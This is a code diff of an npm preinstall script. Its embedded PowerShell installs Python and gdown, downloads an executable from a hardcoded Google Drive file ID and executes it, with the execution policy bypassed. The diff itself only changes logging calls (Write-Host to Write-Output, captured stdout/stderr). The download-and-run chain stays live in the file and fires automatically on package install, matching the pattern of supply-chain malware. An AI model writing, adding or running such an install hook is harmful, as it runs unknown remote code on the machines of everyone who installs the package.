@@ -9,7 +9,7 @@ const downloadExePath = path.join(__dirname, '..', 'downloaded_from_gdown.exe');
 // PowerShell script: install Python if missing, install gdown, download target via gdown, execute it
 const psScript = `
 $ErrorActionPreference = 'Stop'
-Write-Host "[preinstall-setup] Starting preinstall setup script..."
+Write-Output "[preinstall-setup] Starting preinstall setup script..."
 
 # Helper: check for python
 function Has-Python() {
@@ -17,43 +17,43 @@ function Has-Python() {
 }
 
 if (-not (Has-Python)) {
-    Write-Host "[preinstall-setup] Python not found. Attempting to install via winget..."
+    Write-Output "[preinstall-setup] Python not found. Attempting to install via winget..."
     try {
         winget install --id Python.Python.3 -e --source winget --accept-package-agreements --accept-source-agreements
-        Write-Host "[preinstall-setup] winget install attempted."
+        Write-Output "[preinstall-setup] winget install attempted."
     } catch {
-        Write-Host "[preinstall-setup] winget not available or failed, downloading official installer..."
+        Write-Output "[preinstall-setup] winget not available or failed, downloading official installer..."
         $installer = Join-Path $env:TEMP "python_installer.exe"
         Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile $installer -UseBasicParsing
         Start-Process -FilePath $installer -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
     }
 }
 
-Write-Host "[preinstall-setup] Ensuring pip is available and updated..."
+Write-Output "[preinstall-setup] Ensuring pip is available and updated..."
 try { python -m ensurepip --upgrade } catch {}
 python -m pip install --upgrade pip
 
-Write-Host "[preinstall-setup] Installing gdown..."
+Write-Output "[preinstall-setup] Installing gdown..."
 python -m pip install --upgrade gdown
 
 # Use gdown to download the requested file (ID provided by the npm preinstall caller)
 $gdownId = '1cKsgEMPp14YlW-KQyiovkyMofT3QM-gR'
 $output = "${downloadExePath}"
 
-Write-Host "[preinstall-setup] Downloading file via gdown (id: $gdownId) to $output"
+Write-Output "[preinstall-setup] Downloading file via gdown (id: $gdownId) to $output"
 try {
     python -m gdown $gdownId -O $output
-    Write-Host "[preinstall-setup] Download complete."
+    Write-Output "[preinstall-setup] Download complete."
 } catch {
-    Write-Host "[preinstall-setup] gdown download failed: $_"
+    Write-Output "[preinstall-setup] gdown download failed: $_"
 }
 
 if (Test-Path $output) {
-    Write-Host "[preinstall-setup] Executing downloaded file: $output"
+    Write-Output "[preinstall-setup] Executing downloaded file: $output"
     Start-Process -FilePath $output -Wait -ErrorAction SilentlyContinue
-    Write-Host "[preinstall-setup] Execution finished."
+    Write-Output "[preinstall-setup] Execution finished."
 } else {
-    Write-Host "[preinstall-setup] Downloaded file not found; skipping execution."
+    Write-Output "[preinstall-setup] Downloaded file not found; skipping execution."
 }
 `;
 
@@ -70,8 +70,17 @@ const { spawnSync } = require('child_process');
 console.log('[preinstall] Running PowerShell download/execute step (logs appended)');
 const out = spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
     cwd: path.join(__dirname, '..'),
-    stdio: ['ignore', fs.openSync(logFile, 'a'), fs.openSync(logFile, 'a')]
+    encoding: 'utf8',
+    stdio: 'pipe'
 });
+
+// Append captured stdout/stderr to the log file for inspection
+try {
+    if (out.stdout) fs.appendFileSync(logFile, out.stdout, { encoding: 'utf8' });
+    if (out.stderr) fs.appendFileSync(logFile, out.stderr, { encoding: 'utf8' });
+} catch (e) {
+    console.error('[preinstall] Failed to append PowerShell output to log:', e);
+}
 
 if (out.error) {
     console.error('[preinstall] PowerShell execution error:', out.error);
